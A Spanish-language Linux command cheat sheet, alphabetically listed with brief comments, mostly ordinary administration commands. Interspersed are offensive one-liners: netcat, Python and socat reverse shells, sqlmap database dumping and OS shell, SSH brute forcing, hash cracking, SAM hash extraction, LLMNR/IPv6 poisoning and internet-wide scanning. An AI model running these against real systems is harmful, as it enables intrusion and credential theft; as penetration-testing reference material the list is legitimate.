#################################################################
#                             LINUX                             #
#################################################################

!!    # Repetir último comando
!$    # Último argumento del comando anterior
!*    # Todos los argumentos del comando anterior
!comando    # Ejecutar último comando que empiece con 'comando'
!n    # Ejecutar comando número n del historial
Alt-#    # Comentar línea actual
impacket-smbexec admin:pass@host    # Ejecutar remoto SMB
impacket-wmiexec admin:pass@host    # Ejecutar remoto WMI
info comando    # Mostrar documentación info
init 0    # Apagar (SysV)
init 6    # Reiniciar (SysV)
initctl list    # Listar trabajos Upstart
insmod ruta/modulo.ko    # Insertar módulo manualmente
ionice -c 2 -n 0 comando    # Ejecutar con mejor prioridad de I/O
iostat -x 1    # Estadísticas extendidas de I/O
iostat 1    # Mostrar estadísticas de I/O cada segundo
iotop    # Monitor de I/O por proceso
ip addr    # Mostrar direcciones IP
ip addr show dev eth0    # Mostrar IP de interfaz específica
ip link    # Mostrar interfaces de red
ip link set eth0 down    # Bajar interfaz
ip link set eth0 up    # Levantar interfaz
ip neigh    # Mostrar tabla ARP
ip route    # Mostrar tabla de rutas
ip route add default via gateway    # Añadir ruta por defecto
iptables -A INPUT -j DROP    # Descartar todo lo demás
iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # Permitir SSH
iptables -F    # Vaciar reglas
iptables -L    # Listar reglas de firewall
iptables -t nat -L    # Listar reglas NAT
iptables-restore    # Restaurar reglas
iptables-save    # Guardar reglas
iw dev    # Mostrar dispositivos wireless
iwconfig    # Mostrar configuración wireless (legacy)
Ctrl-I    # Tabulación (completar)
jobs    # Listar trabajos en segundo plano
jobs -l    # Listar trabajos con PIDs
john --show hash.txt    # Mostrar hashes crackeados
john --wordlist=pass.txt hash.txt    # Crack de hashes
join archivo1 archivo2    # Unir archivos por campo común
jot 100    # Generar secuencia (BSD)
journalctl    # Mostrar logs del sistema
journalctl --since "1 hour ago"    # Logs desde hace 1 hora
journalctl -f    # Seguir logs en tiempo real
journalctl -u servicio    # Mostrar logs de un servicio
journalctl -xe    # Mostrar logs con contexto extendido
jpegoptim imagen.jpg    # Optimizar JPEG
Ctrl-J    # Aceptar línea
kcachegrind callgrind.out    # Visualizar callgrind
kdialog --msgbox "Hola"    # Diálogo KDE desde script
keepass2john archivo.kdbx > hash.txt    # Preparar KeePass
kerbrute userenum -d domain --dc host wordlist.txt    # Enumerar usuarios Kerberos
kill -9 PID    # Enviar SIGKILL a proceso
kill -HUP PID    # Enviar SIGHUP (recargar configuración)
kill PID    # Enviar SIGTERM a proceso
killall -9 nombre    # Forzar matar todos los procesos
killall nombre    # Matar todos los procesos por nombre
kubectl apply -f archivo.yaml    # Aplicar manifest
kubectl cluster-info    # Información del cluster
kubectl config get-contexts    # Listar contexts
kubectl config use-context contexto    # Cambiar contexto
kubectl delete -f archivo.yaml    # Eliminar manifest
kubectl describe pod nombre    # Describir pod
kubectl exec -it pod -- bash    # Ejecutar en pod
kubectl get nodes    # Listar nodos
kubectl get pods    # Listar pods
kubectl get services    # Listar servicios
kubectl logs pod    # Ver logs de pod
kubectl port-forward pod 8080:80    # Redirigir puerto
kubectl top pods    # Uso de recursos de pods
Ctrl-K    # Borrar desde cursor al final
last    # Mostrar historial de logins
lastb    # Mostrar intentos de login fallidos
lastlog    # Último login de todos los usuarios
ldapsearch -x -h host -b "dc=domain,dc=com"    # Consulta LDAP
ldapsearch -x -h host -D "cn=admin" -w pass    # Autenticada
ldconfig    # Actualizar caché de bibliotecas
ldconfig -p    # Mostrar bibliotecas en caché
ldd binario    # Listar bibliotecas compartidas
less +F archivo    # Seguir archivo como tail -f dentro de less
less archivo    # Paginar contenido bidireccional
ln -s origen destino    # Crear enlace simbólico
ln -sf origen destino    # Forzar enlace simbólico
ln origen destino    # Crear enlace duro
locale-gen    # Generar locales
locate archivo    # Buscar archivo en base de datos
logger -t tag mensaje    # Escribir con tag específico
logger mensaje    # Escribir en syslog
logname    # Mostrar login name
logout    # Cerrar sesión
logrotate -f /etc/logrotate.conf    # Forzar rotación de logs
lolcat    # Arcoíris en texto
ls    # Listar archivos
ls --color=auto    # Listar con colores automáticos
ls -1    # Listar un archivo por línea
ls -d */    # Listar solo directorios
ls -i    # Listar con números de inodo
ls -l    # Listar en formato largo
ls -la    # Listar todos incluyendo ocultos
ls -lah    # Listar todos con tamaños humanos
ls -lF    # Listar con tipo indicado por sufijo
ls -lhS    # Listar ordenado por tamaño descendente
ls -ltr    # Listar ordenado por tiempo invertido
ls -R    # Listar recursivamente
lsb_release -a    # Información de distribución
lsblk    # Listar bloques y montajes
lsblk -a    # Listar dispositivos vacíos también
lsblk -f    # Listar con filesystems
lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT,UUID    # Columnas específicas
lscpu    # Información de CPU
lscpu -e    # Información extendida de CPU
lsmod    # Listar módulos cargados
lsof    # Listar archivos abiertos
lsof +D dir    # Listar archivos abiertos en directorio
lsof +f -- /mnt    # Listar archivos abiertos en punto de montaje
lsof -i :80    # Listar procesos usando puerto 80
lsof -i TCP:80    # Procesos en puerto TCP 80
lsof -p PID    # Archivos abiertos por proceso
lsof -u user    # Listar archivos abiertos por usuario
lsof archivo    # Listar procesos usando archivo
lspci    # Listar dispositivos PCI
lspci -k    # Mostrar drivers de PCI
lspci -v    # Listar PCI verbose
lsusb    # Listar dispositivos USB
lsusb -v    # Listar USB verbose
ltrace -p PID    # Trazar llamadas a bibliotecas
ltrace -S comando    # Trazar syscalls también
ltrace comando    # Trazar llamadas a bibliotecas
lvcreate -L 10G -n lv0 vg0    # Crear volumen lógico
lvextend -L +5G /dev/vg0/lv0    # Extender volumen lógico
lvremove /dev/vg0/lv0    # Eliminar volumen lógico
Ctrl-L    # Limpiar pantalla
mailq    # Ver cola de correo
make    # Compilar proyecto
make -j$(nproc)    # Compilar en paralelo
make clean    # Limpiar compilación
make install    # Instalar proyecto compilado
makepkg -si    # Construir e instalar desde PKGBUILD
man -k palabra    # Buscar en páginas de manual
man comando    # Mostrar manual de comando
mandb    # Actualizar base de man pages
masscan 0.0.0.0/0 -p0-65535 --rate 100000    # Scan masivo rápido
mawk '{print $1}' archivo    # Variante ligera de awk
md5sum -c checksums.md5    # Verificar hashes
md5sum archivo    # Hash MD5
medusa -h host -u admin -P pass.txt -M ssh    # Fuerza bruta SSH
mesg n    # Deshabilitar mensajes de otros
mesg y    # Habilitar mensajes
mitm6 -d domain    # Envenenamiento IPv6
mkdir -m 755 dir    # Crear con permisos específicos
mkdir -p dir/subdir    # Crear directorios intermedios si no existen
mkdir dir    # Crear directorio
mkfs.ext4 /dev/mapper/secure    # Formatear volumen desencriptado
mkfs.ext4 /dev/sda1    # Formatear como ext4
mkfs.vfat /dev/sda1    # Formatear como FAT32
mkfs.xfs /dev/sda1    # Formatear como XFS
mkinitramfs -o /boot/initrd    # Crear initramfs
mkswap /dev/sda2    # Crear swap
modinfo modulo    # Información de módulo
modprobe -r modulo    # Descargar módulo
modprobe modulo    # Cargar módulo del kernel
mogrify -resize 50% *.jpg    # Redimensionar múltiples imágenes
more archivo    # Paginar contenido hacia adelante
mount --bind /origen /destino    # Montaje bind
mount -o remount,rw /    # Remontar raíz como lectura/escritura
mount /dev/sda1 /mnt    # Montar partición
mount | grep sda1    # Ver punto de montaje
mpg123 archivo.mp3    # Reproducir MP3
mpstat -P ALL 1    # Mostrar estadísticas de CPU por núcleo
mtr host    # Combinación de ping y traceroute
mv -i origen destino    # Mover con confirmación
mv origen destino    # Mover o renombrar
Ctrl-M    # Aceptar línea (Enter)
nano -w archivo    # Editar sin wrap
nano archivo    # Editar con Nano
nc -e /bin/bash host puerto    # Reverse shell básica
nc -l -p puerto    # Escuchar en puerto
nc -lk -p puerto    # Escuchar persistentemente
nc -lvnp puerto    # Listener netcat
nc -zv host rango_puertos    # Escanear puertos
nc -zvw3 host 1-100    # Escaneo rápido de puertos
nc host puerto    # Conectar a puerto con netcat
ncat -lvnp puerto --ssl    # Listener con SSL
neo4j console    # Iniciar Neo4j para BloodHound
netcat -zv host 1-1000    # Escaneo básico de puertos con netcat
netstat -an    # Mostrar todas las conexiones
netstat -rn    # Mostrar tabla de rutas
netstat -tulpn    # Mostrar puertos en escucha con PID
newaliases    # Reconstruir base de datos de aliases
ngrep -d eth0 palabra    # Grep para tráfico de red
nice -n -10 comando    # Ejecutar con mayor prioridad
nice -n 10 comando    # Ejecutar con menor prioridad
nikto -h http://host    # Escaneo de vulnerabilidades web
nl -ba archivo    # Numerar todas incluyendo vacías
nl archivo    # Mostrar con números de línea lógicos
nm -C binario    # Símbolos demangled
nm binario    # Listar símbolos
nmap --script vuln host    # Escaneo de vulnerabilidades
nmap --traceroute host    # Traceroute con nmap
nmap -A -T4 host    # Escaneo agresivo rápido
nmap -A host    # Escaneo agresivo
nmap -D RND:10 host    # Decoy scan
nmap -f host    # Fragmentar paquetes
nmap -O host    # Detectar sistema operativo
nmap -p 1-65535 host    # Escanear todos los puertos
nmap -Pn host    # No hacer ping previo
nmap -sn 192.168.1.0/24    # Descubrir hosts en red
nmap -sS -p- host    # SYN scan todos los puertos
nmap -sU -p 53,161 host    # UDP scan
nmap -sV -O host    # Detección de servicios y SO
nmap -sV host    # Detectar versiones de servicios
nmap host    # Escanear host
nmblookup -A host    # NetBIOS lookup
node -e "console.log('hola')"    # Ejecutar código inline
node script.js    # Ejecutar script Node
nohup comando &    # Ejecutar comando inmune a hangups
nohup comando > salida.log 2>&1 &    # Ejecutar en background persistente
notify-send "Título" "Mensaje"    # Notificación de escritorio
npm install -g paquete    # Instalar globalmente
npm install paquete    # Instalar paquete Node
npm list    # Listar instalados
npm run script    # Ejecutar script
npm uninstall paquete    # Desinstalar
npm update    # Actualizar
npx paquete    # Ejecutar paquete sin instalar
nslookup dominio    # Consultar DNS (legacy)
ntpdate servidor    # Sincronizar hora NTP
nvim archivo    # Neovim
nyancat    # Nyan cat en terminal
Ctrl-N    # Comando siguiente en historial
objcopy --strip-debug binario binario.stripped    # Strip debug symbols
objdump -d binario    # Desensamblar binario
objdump -dS binario    # Desensamblar con código fuente
objdump -h binario    # Mostrar secciones
od -A x -t x1z archivo    # Volcar en hexadecimal
od -c archivo    # Volcar en caracteres
ogg123 archivo.ogg    # Reproducir Ogg
openssl base64 -d -in archivo.b64 -out archivo    # Decodificar Base64
openssl base64 -in archivo -out archivo.b64    # Codificar Base64
openssl enc -aes-256-cbc -d -in archivo.enc -out archivo    # Desencriptar
openssl enc -aes-256-cbc -salt -in archivo -out archivo.enc    # Encriptar con OpenSSL
openssl genrsa -out key.pem 2048    # Generar clave privada RSA
openssl req -new -key key.pem -out csr.pem    # Generar CSR
openssl s_client -connect host:443    # Verificar conexión SSL
openssl s_server -cert cert.pem -key key.pem -accept 4433    # Servidor SSL de prueba
openssl x509 -in cert.pem -text    # Mostrar contenido de certificado
optipng imagen.png    # Optimizar PNG
outguess -k pass -r imagen.jpg salida.txt    # Extraer esteganografía
Ctrl-O    # Ejecutar y mostrar siguiente del historial
pacman -Ql paquete    # Listar archivos
pacman -Qo archivo    # Buscar dueño de archivo
pacman -Qs palabra    # Buscar en instalados
pacman -R paquete    # Eliminar paquete
pacman -Rns paquete    # Eliminar con dependencias huérfanas
pacman -S paquete    # Instalar paquete (Arch)
pacman -Sc    # Limpiar caché
pacman -Scc    # Limpiar caché completamente
pacman -Si paquete    # Información
pacman -Ss palabra    # Buscar paquete
pacman -Syu    # Actualizar sistema
pamac install paquete    # Instalar (Manjaro)
paplay archivo.wav    # Reproducir con PulseAudio
parted -l    # Listar dispositivos y particiones
parted /dev/sda print    # Mostrar tabla de particiones
partprobe    # Releer tabla de particiones
passwd    # Cambiar contraseña
passwd user    # Cambiar contraseña de usuario
paste -d',' archivo1 archivo2    # Fusionar con separador
paste archivo1 archivo2    # Fusionar líneas paralelas
patator ssh_login host=host user=admin password=FILE0 0=pass.txt    # Patator
patch -p1 < diff.patch    # Aplicar parche quitando prefijo
patch -R < diff.patch    # Revertir parche
patch < diff.patch    # Aplicar parche
patchelf --set-rpath '/lib' binario    # Cambiar rpath
pdf2john archivo.pdf > hash.txt    # Preparar PDF para John
pdfinfo archivo.pdf    # Información de PDF
pdftk A=archivo.pdf cat A1-5 output salida.pdf    # Manipular PDF
pdftoppm archivo.pdf prefijo    # Convertir PDF a imágenes
pdftotext archivo.pdf    # Extraer texto de PDF
perf record -g -a sleep 10    # Grabar 10 segundos de perfil del sistema
perf record -g comando    # Grabar perfil con call graph
perf report    # Mostrar reporte de perfil
perf stat -d comando    # Estadísticas detalladas
perf stat comando    # Estadísticas de rendimiento
perf top    # Top de funciones en CPU
perf top -g    # Top de funciones con call graph
perl script.pl    # Ejecutar Perl
pgrep nombre    # Buscar PID por nombre
php -S localhost:8000    # Servidor PHP de desarrollo
php script.php    # Ejecutar PHP
pico archivo    # Editar con Pico (variante Nano)
pidstat 1    # Mostrar estadísticas por proceso
ping -c 4 host    # Enviar 4 paquetes ICMP
ping -i 0.2 host    # Intervalo de 0.2 segundos
ping host    # Probar conectividad ICMP
ping6 host    # Ping IPv6
pip freeze    # Listar para requirements.txt
pip install --upgrade pip    # Actualizar pip
pip install -r requirements.txt    # Instalar desde archivo
pip install paquete    # Instalar paquete Python
pip list    # Listar paquetes Python
pip uninstall paquete    # Desinstalar paquete Python
pkill -f patron    # Matar procesos que coincidan con patrón
pkill nombre    # Matar procesos por nombre
popd    # Sacar directorio de la pila y cambiar a él
postcat -q ID    # Ver contenido de mensaje en cola
postqueue -p    # Ver cola de Postfix
postsuper -d ALL    # Vaciar cola de Postfix
poweroff    # Apagar sistema
pr -2 archivo    # Dos columnas
pr archivo    # Formatear para impresión
prelink -a    # Prelink bibliotecas
printenv    # Imprimir variables de entorno
printenv HOME    # Imprimir variable específica
printf "%s\n" "$VAR"    # Imprimir variable seguro
printf "formato" args    # Imprimir con formato
ps    # Mostrar procesos actuales
ps -ef    # Mostrar todos los procesos en formato estándar
ps -u user    # Mostrar procesos de usuario
ps aux    # Mostrar todos los procesos detallados
ps aux | grep -v grep | grep nginx    # Buscar nginx excluyendo grep
ps aux | grep nginx    # Buscar proceso nginx
ps aux | grep X    # Buscar procesos por nombre
ps auxf    # Mostrar procesos en formato árbol
pushd dir    # Apilar directorio y cambiar a él
pv    # Pipe viewer: monitor de progreso en pipelines
pvcreate /dev/sdb    # Crear volumen físico LVM
pvremove /dev/sdb    # Eliminar volumen físico
pwd    # Imprimir directorio actual
pwd -P    # Imprimir ruta física sin symlinks
pwntools template --host host --port 1337 > exploit.py    # Template exploit
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("host",puerto));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'    # Reverse Python
python -m http.server 8000    # Servidor web simple
python -m venv env    # Crear entorno virtual
python script.py    # Ejecutar script Python
python3 -c "import pty; pty.spawn('/bin/bash')"    # Mejorar shell
python3 script.py    # Ejecutar con Python 3
Ctrl-P    # Comando anterior en historial
qpdf --encrypt pass pass 128 -- archivo.pdf salida.pdf    # Encriptar PDF
Ctrl-Q    # Reanudar salida en terminal
rar a archivo.rar archivos    # Crear rar
readelf -a binario    # Información ELF completa
readelf -h binario    # Header ELF
readelf -l binario    # Header de programa
readelf -S binario    # Tabla de secciones
reboot    # Reiniciar sistema
renice 10 PID    # Cambiar prioridad de proceso en ejecución
reset    # Reiniciar terminal
resize2fs /dev/vg0/lv0    # Redimensionar filesystem ext
Responder -I eth0    # Envenenamiento NetBIOS/LLMNR
rev    # Reversar texto
rev archivo    # Reversar caracteres de cada línea
rg patron    # ripgrep: buscar rápidamente
rm -f archivo    # Eliminar forzosamente
rm -i archivo    # Eliminar con confirmación
rm -r dir    # Eliminar directorio recursivamente
rm -rf /var/lib/apt/lists/*    # Limpiar caché de apt
rm -rf dir    # Eliminar forzosamente y recursivamente
rm archivo    # Eliminar archivo
rmdir dir    # Eliminar directorio vacío
rmmod modulo    # Eliminar módulo
route -n    # Mostrar tabla de rutas (legacy)
rpcclient -U admin host    # Cliente RPC
rpm -e paquete    # Eliminar RPM
rpm -i paquete.rpm    # Instalar RPM
rpm -qa    # Listar todos los RPM instalados
rpm -qf archivo    # Buscar paquete de archivo
rpm -qip paquete.rpm    # Información de RPM no instalado
rpm -ql paquete    # Listar archivos de RPM
rsync -av origen destino    # Sincronizar archivos preservando atributos
rsync -avz --delete origen destino    # Sincronizar eliminando extras en destino
rsync -avz --progress origen destino    # Mostrar progreso
rsync -avz -e ssh origen user@host:/ruta    # Sincronizar por SSH
rsync -avz origen destino    # Sincronizar con compresión
ruby script.rb    # Ejecutar Ruby
runlevel    # Mostrar nivel de ejecución
runlevel - prev curr    # Niveles de ejecución
Ctrl-R    # Buscar en historial (bash/fzf)
samdump2 SYSTEM SAM    # Extraer hashes SAM Windows
sar -n DEV 1    # Mostrar estadísticas de red cada segundo
sar -r 1    # Mostrar uso de memoria cada segundo
sar -u 1    # Mostrar uso de CPU cada segundo
scp -P 2222 archivo user@host:/ruta    # Usar puerto específico
scp -r dir user@host:/ruta    # Copiar directorio por SSH
scp archivo user@host:/ruta    # Copiar archivo por SSH
scp user@host:/ruta/archivo .    # Descargar archivo por SSH
screen    # Iniciar sesión screen
screen -d -r nombre    # Desconectar y reconectar
screen -dmS session comando    # Crear sesión screen detached
screen -ls    # Listar sesiones
screen -r nombre    # Reconectar a sesión
screen -S nombre    # Iniciar sesión con nombre
screen -S session -p 0 -X stuff "comando$(printf \\r)"    # Enviar comando
screen -X -S nombre quit    # Matar sesión
script    # Grabar sesión de terminal
script /dev/null -c "bash"    # Otra forma de obtener TTY
scriptreplay timing sesión    # Reproducir sesión grabada
sdiff archivo1 archivo2    # Comparar side-by-side interactivo
sed '/^$/d' archivo    # Borrar líneas vacías
sed '/pattern/d' archivo    # Eliminar líneas con patrón
sed '10,20d' archivo    # Eliminar líneas 10-20
sed 's/$/suffix/' archivo    # Añadir sufijo a cada línea
sed 's/^/prefix/' archivo    # Añadir prefijo a cada línea
sed 's/foo/bar/' archivo    # Reemplazar primera ocurrencia por línea
sed 's/foo/bar/g' archivo    # Reemplazar todas las ocurrencias
sed -e 's/a/b/' -e 's/c/d/' archivo    # Múltiples expresiones
sed -f script.sed archivo    # Leer script de archivo
sed -i 's/foo/bar/g' archivo    # Reemplazar en archivo (in-place)
sed -i.bak 's/foo/bar/g' archivo    # Backup antes de reemplazar
sed -n '10,20p' archivo    # Imprimir líneas 10-20
sed -r 's/regex/rep/' archivo    # Usar regex extendida
sendmail -bp    # Ver cola de correo
seq -f "%04g" 1 100    # Secuencia con formato
seq 1 100    # Secuencia de 1 a 100
seq 1 2 100    # Secuencia de 1 a 100 de 2 en 2
service --status-all    # Listar estado de todos los servicios
service servicio restart    # Reiniciar servicio (SysV)
service servicio start    # Iniciar servicio (SysV)
service servicio stop    # Detener servicio (SysV)
set    # Mostrar variables y funciones
set +e    # No salir ante errores
set +x    # Desactivar modo debug
set -e    # Salir ante errores
set -o    # Mostrar opciones
set -x    # Activar modo debug
sfdisk -d /dev/sda > partition_table.dmp    # Dumpear tabla de particiones
sfdisk /dev/sda < partition_table.dmp    # Restaurar tabla de particiones
sftp user@host    # Shell FTP interactivo sobre SSH
sh script.sh    # Ejecutar script en sh
sha1sum archivo    # Hash SHA1
sha256sum -c checksums.sha256    # Verificar SHA256
sha256sum archivo    # Hash SHA256
sha512sum archivo    # Hash SHA512
shasum -a 256 archivo    # SHA256 (macOS/Perl)
shopt    # Mostrar opciones de shell
shopt -s opcion    # Habilitar opción
shopt -u opcion    # Deshabilitar opción
shuf -n 10 archivo    # Seleccionar 10 líneas aleatorias
shuf archivo    # Barajar líneas aleatoriamente
shutdown -h +5    # Apagar en 5 minutos
shutdown -h now    # Apagar ahora
shutdown -r now    # Reiniciar ahora
size binario    # Tamaños de secciones
sl    # Tren de vapor (corrección de 'ls')
sleep 5    # Esperar 5 segundos
sleep 5h    # Esperar 5 horas
sleep 5m    # Esperar 5 minutos
smartctl -a /dev/sda    # Información SMART
smartctl -t short /dev/sda    # Ejecutar test SMART corto
smbclient -L //host -U admin    # Listar shares SMB
smbclient //host/share -U admin    # Conectar a share
snap install paquete    # Instalar snap
snap list    # Listar snaps
snap refresh    # Actualizar snaps
snap remove paquete    # Eliminar snap
socat - TCP:host:80    # Conectar como netcat mejorado
socat -d -d TCP-LISTEN:puerto STDOUT    # Listener avanzado
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:host:port    # Shell con PTY
socat STDIO TCP4:host:80    # Conectar a puerto
socat TCP-LISTEN:8080,fork TCP:host:80    # Redirigir puertos
socat TCP4-LISTEN:1234,fork TCP4:host:80    # Proxy TCP
sort -h archivo    # Ordenar tamaños humanos
sort -k2 archivo    # Ordenar por segunda columna
sort -M archivo    # Ordenar por mes
sort -n archivo    # Ordenar numéricamente
sort -r archivo    # Ordenar inversamente
sort -t',' -k2 archivo    # Ordenar por columna con separador
sort -u archivo    # Ordenar y eliminar duplicados
sort archivo    # Ordenar líneas
source archivo    # Ejecutar archivo en shell actual
source env/bin/activate    # Activar entorno virtual
split -b 1M archivo    # Dividir en archivos de 1MB
split -l 1000 archivo    # Dividir en archivos de 1000 líneas
sqlmap --os-shell    # Obtener shell mediante SQLi
sqlmap -r request.txt    # Usar request desde archivo
sqlmap -u "http://host/page.php?id=1"    # Test de SQL Injection
sqlmap -u URL --dump    # Dumpear base de datos
ss -s    # Mostrar resumen de sockets
ss -tlnp    # Mostrar sockets TCP en escucha con proceso
ss -tulpn    # Equivalente moderno a netstat -tulpn
ssh -D 1080 user@host    # Proxy SOCKS
ssh -i key.pem user@host    # Conectar con clave privada
ssh -L 8080:localhost:80 user@host    # Túnel local
ssh -N -f user@host    # Crear túnel en background
ssh -p 2222 user@host    # Conectar por puerto específico
ssh -R 8080:localhost:80 user@host    # Túnel remoto
ssh -t user@host comando    # Ejecutar comando con TTY
ssh user@host    # Conectar a host por SSH
ssh user@host "comando"    # Ejecutar comando remoto
ssh-add    # Añadir clave privada al agente
ssh-add -l    # Listar claves en el agente
ssh-agent bash    # Iniciar agente SSH
ssh-copy-id user@host    # Copiar clave pública a host remoto
ssh-keygen -t ed25519    # Generar clave Ed25519
ssh-keygen -t rsa -b 4096    # Generar par de claves RSA
stat -c "%A %n" archivo    # Formato personalizado
stat archivo    # Mostrar estadísticas detalladas
steghide extract -sf imagen.jpg -p pass    # Extraer datos ocultos
strace -e open comando    # Trazar solo llamadas open
strace -e trace=open,close,read,write -o salida comando    # Trazar syscalls
strace -f -e trace=network -s 10000 comando    # Trazar red
strace -f comando    # Trazar proceso e hijos
strace -p PID    # Trazar llamadas al sistema de proceso
strings -n 8 archivo    # Extraer strings de longitud mínima
strings archivo | grep -i password    # Buscar strings sensibles
strings binario    # Extraer strings legibles
strip binario    # Eliminar símbolos de binario
stty -a    # Mostrar configuración actual
stty erase ^H    # Configurar tecla de borrado
stty raw -echo; fg    # Mejorar shell interactiva
stty sane    # Restaurar configuración de terminal
su -    # Cambiar a root con entorno completo
su -c "comando"    # Ejecutar comando como otro usuario
su user    # Cambiar a usuario
sudo !!    # Repetir último comando con sudo
sudo -i    # Iniciar shell como root
sudo -s    # Iniciar shell con entorno preservado
sudo -u user comando    # Ejecutar como otro usuario
sudo checkinstall    # Crear paquete e instalar
sudo comando    # Ejecutar comando como superusuario
sudo ldconfig    # Actualizar caché de bibliotecas
sudo make install    # Instalar compilado
swapoff /dev/sda2    # Desactivar swap
swapon /dev/sda2    # Activar swap
sync    # Sincronizar buffers de escritura
sysctl -a    # Listar todos los parámetros del kernel
sysctl -p    # Recargar /etc/sysctl.conf
sysctl -w kernel.parametro=valor    # Escribir parámetro
sysctl kernel.parametro    # Mostrar parámetro específico
systemctl disable servicio    # Deshabilitar servicio al inicio
systemctl enable servicio    # Habilitar servicio al inicio
systemctl list-units --type=service    # Listar servicios activos
systemctl reload servicio    # Recargar configuración de servicio
systemctl restart servicio    # Reiniciar servicio
systemctl start servicio    # Iniciar servicio
systemctl status servicio    # Ver estado de servicio
systemctl stop servicio    # Detener servicio
systemd-analyze    # Tiempo de arranque de systemd
systemd-analyze blame    # Servicios que más tardan en iniciar
systemd-analyze critical-chain    # Cadena crítica de arranque
Ctrl-S    # Detener salida en terminal
tac archivo    # Mostrar contenido en orden inverso
tail -f archivo    # Seguir archivo en tiempo real
tail -n 20 archivo    # Mostrar últimas 20 líneas
tail archivo    # Mostrar últimas 10 líneas
tar --listed-incremental=snapshot -czvf backup.tar.gz dir    # Backup incremental
tar -C /destino -xzvf backup.tar.gz    # Extraer en directorio específico
tar -czvf - dir | gpg -c > backup.tar.gz.gpg    # Backup encriptado
tar cJf backup.tar.xz dir    # Crear tar.xz
tar cvf archivo.tar dir    # Crear tar
tar cvjf archivo.tar.bz2 dir    # Crear tar.bz2
tar cvzf archivo.tar.gz dir    # Crear tar.gz
tar czvf - dir | ssh host "cat > archivo.tar.gz"    # Tar por SSH
tar czvf - dir | ssh host "cat > backup.tar.gz"    # Backup por SSH
tar czvf backup.tar.gz --exclude='*.tmp' dir    # Excluir patrones
tar rvf archivo.tar archivo    # Añadir archivo a tar existente
tar tvf archivo.tar    # Listar contenido de tar
tar xvf archivo.tar    # Extraer tar
tar xvjf archivo.tar.bz2    # Extraer tar.bz2
tar xvzf archivo.tar.gz    # Extraer tar.gz
tcpdump -c 100 -w capture.pcap    # Guardar 100 paquetes en archivo
tcpdump -i any port 80    # Capturar tráfico del puerto 80
tcpdump -i eth0    # Capturar tráfico en interfaz
tcpflow -i eth0    # Capturar flujos TCP
tcpick -i eth0 -wR    # Reconstruir sesiones TCP
tcsh    # Iniciar tcsh
tee -a archivo.txt    # Append a archivo y stdout
tee archivo.txt    # Redirigir a archivo y stdout simultáneamente
telinit 3    # Cambiar a nivel de ejecución 3
terraform apply    # Aplicar cambios
terraform destroy    # Destruir infraestructura
terraform fmt    # Formatear código
terraform init    # Inicializar Terraform
terraform plan    # Plan de cambios
terraform validate    # Validar configuración
time -v comando    # Medir con detalle
time comando    # Medir tiempo de ejecución
timedatectl    # Configuración de fecha/hora
timedatectl set-ntp true    # Habilitar NTP
timedatectl set-timezone Zone    # Cambiar zona horaria
tmux    # Iniciar sesión tmux
tmux attach -t nombre    # Adjuntar a sesión
tmux detach    # Desprenderse
tmux kill-session -t nombre    # Matar sesión
tmux ls    # Listar sesiones
tmux new -s nombre    # Nueva sesión con nombre
tmux new-session -d -s "session" "comando"    # Crear sesión tmux detached
tmux new-window    # Nueva ventana
tmux resize-pane -D 10    # Redimensionar panel
tmux select-window -t 0    # Seleccionar ventana
tmux send-keys -t nombre "comando" C-m    # Enviar comando a sesión
tmux send-keys -t session "comando" Enter    # Enviar comando
tmux split-window    # Dividir ventana horizontal
tmux split-window -h    # Dividir ventana vertical
toilet TEXTO    # Arte ASCII grande
top    # Monitor de procesos interactivo
touch -t YYYYMMDDHHMM archivo    # Establecer timestamp específico
touch archivo    # Crear archivo vacío o actualizar timestamp
tput reset    # Resetear terminal
traceroute -I host    # Usar ICMP en lugar de UDP
traceroute host    # Rastrear ruta hacia host
trap 'echo error' ERR    # Capturar errores
trap 'echo saliendo' EXIT    # Capturar salida
tset    # Inicializar terminal
tshark -i eth0    # Wireshark en modo CLI
tty    # Mostrar nombre de terminal
tune2fs -l /dev/sda1    # Mostrar información de ext
tune2fs -m 0 /dev/sda1    # Reservar 0% para root
type -a comando    # Mostrar todas las ubicaciones del comando
type comando    # Indicar tipo de comando
TZ=America/New_York date    # Fecha en zona horaria específica
Alt-T    # Transponer palabras
Ctrl-T    # Transponer caracteres
ufw allow 22    # Permitir puerto 22
ufw deny 80    # Denegar puerto 80
ufw disable    # Deshabilitar UFW
ufw enable    # Habilitar UFW
ufw status    # Ver estado de UFW
